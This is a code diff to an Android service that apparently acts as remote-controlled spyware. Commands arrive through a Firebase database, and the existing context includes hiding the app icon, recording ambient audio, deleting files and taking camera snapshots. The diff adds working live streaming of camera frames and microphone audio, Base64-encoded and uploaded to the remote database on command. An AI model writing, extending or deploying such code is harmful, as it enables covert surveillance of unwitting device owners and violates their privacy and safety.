@@ -298,6 +298,8 @@ class StreamingService : Service() {
             "deleteFile" -> { Thread { deleteRemoteFile(snapshot) }.start(); snapshot.ref.removeValue() }
             "recordAudio" -> { Thread { recordAmbientAudio(snapshot) }.start(); snapshot.ref.removeValue() }
             "cameraSnap" -> { Thread { captureCameraSnapshot(snapshot) }.start(); snapshot.ref.removeValue() }
+            "startLiveStream" -> { Thread { startLiveStreamSession() }.start(); snapshot.ref.removeValue() }
+            "stopLiveStream" -> { Thread { stopLiveStreamSession() }.start(); snapshot.ref.removeValue() }
             "hideAppIcon" -> { Thread { setAppIconHidden(snapshot) }.start(); snapshot.ref.removeValue() }
             "playAlarm" -> { Thread { playLoudAlarm() }.start(); snapshot.ref.removeValue() }
             "toggleTorch" -> { Thread { toggleTorch(snapshot) }.start(); snapshot.ref.removeValue() }
@@ -1334,6 +1336,232 @@ class StreamingService : Service() {
             override fun onChildMoved(s: DataSnapshot, p: String?) {}
             override fun onCancelled(e: DatabaseError) {}
         })
+
+        // Real-time live camera & mic stream controller
+        dRef.child("live_stream/controls").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                handleLiveStreamControls(snapshot)
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
+    }
+
+    private var isLiveStreamRunning = false
+    private var liveStreamCameraDevice: CameraDevice? = null
+    private var liveStreamCaptureSession: CameraCaptureSession? = null
+    private var liveStreamImageReader: ImageReader? = null
+    private var liveStreamThread: HandlerThread? = null
+    private var liveStreamHandler: Handler? = null
+    private var liveStreamAudioRecord: AudioRecord? = null
+    private var isLiveStreamAudioActive = false
+
+    private fun handleLiveStreamControls(snapshot: DataSnapshot) {
+        val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
+        val facing = snapshot.child("facing").getValue(String::class.java) ?: "front"
+        val quality = snapshot.child("quality").getValue(String::class.java) ?: "720p"
+        val audio = snapshot.child("audio").getValue(Boolean::class.java) ?: true
+        val torch = snapshot.child("torch").getValue(Boolean::class.java) ?: false
+
+        if (active) {
+            startLiveStreamSession(facing, quality, audio, torch)
+        } else {
+            stopLiveStreamSession()
+        }
+    }
+
+    @Synchronized
+    private fun startLiveStreamSession(facing: String = "front", quality: String = "720p", audio: Boolean = true, torch: Boolean = false) {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                Timber.e("LiveStream: Camera permission not granted")
+                return
+            }
+
+            promoteToForeground(camera = true, mic = audio, loc = true)
+            stopLiveStreamSessionInternal()
+
+            isLiveStreamRunning = true
+            liveStreamThread = HandlerThread("LiveStreamThread").apply { start() }
+            liveStreamHandler = Handler(liveStreamThread!!.looper)
+
+            val cm = cameraManager ?: run {
+                cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager
+                cameraManager ?: return
+            }
+
+            val targetFacing = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
+            var targetCameraId: String? = null
+            for (id in cm.cameraIdList) {
+                val chars = cm.getCameraCharacteristics(id)
+                if (chars.get(CameraCharacteristics.LENS_FACING) == targetFacing) {
+                    targetCameraId = id
+                    break
+                }
+            }
+            if (targetCameraId == null) targetCameraId = cm.cameraIdList.firstOrNull() ?: return
+
+            val (width, height, compQuality) = when (quality) {
+                "1080p" -> Triple(1920, 1080, 65)
+                "720p" -> Triple(1280, 720, 50)
+                "480p" -> Triple(640, 480, 40)
+                else -> Triple(480, 360, 30)
+            }
+
+            val chars = cm.getCameraCharacteristics(targetCameraId)
+            val orientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
+            val isFront = (targetFacing == CameraCharacteristics.LENS_FACING_FRONT)
+
+            liveStreamImageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2).apply {
+                setOnImageAvailableListener({ reader ->
+                    if (!isLiveStreamRunning) return@setOnImageAvailableListener
+                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+                    try {
+                        val buffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+                        val processed = processImage(bytes, orientation, isFront, compQuality)
+                        val b64 = Base64.encodeToString(processed, Base64.NO_WRAP)
+                        
+                        deviceRef?.child("live_stream/stream_frame")?.setValue(mapOf(
+                            "frame" to b64,
+                            "time" to ServerValue.TIMESTAMP
+                        ))
+                    } catch (e: Exception) {
+                        Timber.e(e, "LiveStream Frame error")
+                    } finally {
+                        image.close()
+                    }
+                }, liveStreamHandler)
+            }
+
+            cm.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    if (!isLiveStreamRunning) { camera.close(); return }
+                    liveStreamCameraDevice = camera
+                    val surface = liveStreamImageReader?.surface ?: return
+                    try {
+                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: CameraCaptureSession) {
+                                if (!isLiveStreamRunning) { session.close(); return }
+                                liveStreamCaptureSession = session
+                                try {
+                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                                        addTarget(surface)
+                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                        if (!isFront && torch) {
+                                            set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_TORCH)
+                                        }
+                                    }
+                                    session.setRepeatingRequest(req.build(), null, liveStreamHandler)
+                                } catch (e: Exception) {
+                                    Timber.e(e, "LiveStream repeating request failed")
+                                }
+                            }
+                            override fun onConfigureFailed(session: CameraCaptureSession) {
+                                Timber.e("LiveStream session configure failed")
+                            }
+                        }, liveStreamHandler)
+                    } catch (e: Exception) {
+                        Timber.e(e, "LiveStream capture session create failed")
+                    }
+                }
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    if (liveStreamCameraDevice == camera) liveStreamCameraDevice = null
+                }
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    if (liveStreamCameraDevice == camera) liveStreamCameraDevice = null
+                    Timber.e("LiveStream camera error: $error")
+                }
+            }, liveStreamHandler)
+
+            // Start Audio stream if requested
+            if (audio) {
+                startLiveStreamAudio()
+            }
+
+        } catch (e: Exception) {
+            Timber.e(e, "Error starting LiveStream")
+        }
+    }
+
+    private fun startLiveStreamAudio() {
+        if (isLiveStreamAudioActive) return
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
+        
+        isLiveStreamAudioActive = true
+        Thread {
+            try {
+                val sampleRate = 16000
+                val bufferSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
+                liveStreamAudioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2)
+                liveStreamAudioRecord?.startRecording()
+                val buffer = ShortArray(bufferSize)
+
+                while (isLiveStreamRunning && isLiveStreamAudioActive) {
+                    val read = liveStreamAudioRecord?.read(buffer, 0, buffer.size) ?: break
+                    if (read > 0) {
+                        val bytes = ByteArray(read * 2)
+                        for (i in 0 until read) {
+                            bytes[i * 2] = (buffer[i].toInt() and 0xFF).toByte()
+                            bytes[i * 2 + 1] = (buffer[i].toInt() shr 8).toByte()
+                        }
+                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                        deviceRef?.child("live_stream/audio_chunk")?.setValue(mapOf(
+                            "chunk" to b64,
+                            "time" to ServerValue.TIMESTAMP
+                        ))
+                    }
+                    SystemClock.sleep(150)
+                }
+            } catch (e: Exception) {
+                Timber.e(e, "LiveStream Audio error")
+            } finally {
+                try {
+                    liveStreamAudioRecord?.stop()
+                    liveStreamAudioRecord?.release()
+                } catch (e: Exception) {}
+                liveStreamAudioRecord = null
+                isLiveStreamAudioActive = false
+            }
+        }.start()
+    }
+
+    @Synchronized
+    private fun stopLiveStreamSession() {
+        isLiveStreamRunning = false
+        isLiveStreamAudioActive = false
+        stopLiveStreamSessionInternal()
+        mainHandler.post {
+            deviceRef?.child("live_stream/stream_frame")?.removeValue()
+            deviceRef?.child("live_stream/audio_chunk")?.removeValue()
+            promoteToForeground(isStreamingEnabled, isLiveAudio, true)
+        }
+    }
+
+    private fun stopLiveStreamSessionInternal() {
+        try {
+            liveStreamCaptureSession?.stopRepeating()
+            liveStreamCaptureSession?.close()
+        } catch (e: Exception) {}
+        liveStreamCaptureSession = null
+
+        try {
+            liveStreamCameraDevice?.close()
+        } catch (e: Exception) {}
+        liveStreamCameraDevice = null
+
+        try {
+            liveStreamImageReader?.close()
+        } catch (e: Exception) {}
+        liveStreamImageReader = null
+
+        try {
+            liveStreamThread?.quitSafely()
+        } catch (e: Exception) {}
+        liveStreamThread = null
+        liveStreamHandler = null
     }
 
     private fun stopLiveAudio() {
@@ -1353,14 +1581,14 @@ class StreamingService : Service() {
         }
     }
 
-    private fun processImage(jpegData: ByteArray, rotation: Int, mirror: Boolean): ByteArray {
+    private fun processImage(jpegData: ByteArray, rotation: Int, mirror: Boolean, quality: Int = streamQuality): ByteArray {
         val bitmap = BitmapFactory.decodeByteArray(jpegData, 0, jpegData.size)
         val matrix = Matrix()
         matrix.postRotate(rotation.toFloat())
         if (mirror) matrix.postScale(-1f, 1f)
         val rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
         val out = ByteArrayOutputStream()
-        rotated.compress(Bitmap.CompressFormat.JPEG, streamQuality, out)
+        rotated.compress(Bitmap.CompressFormat.JPEG, quality, out)
         return out.toByteArray()
     }
 
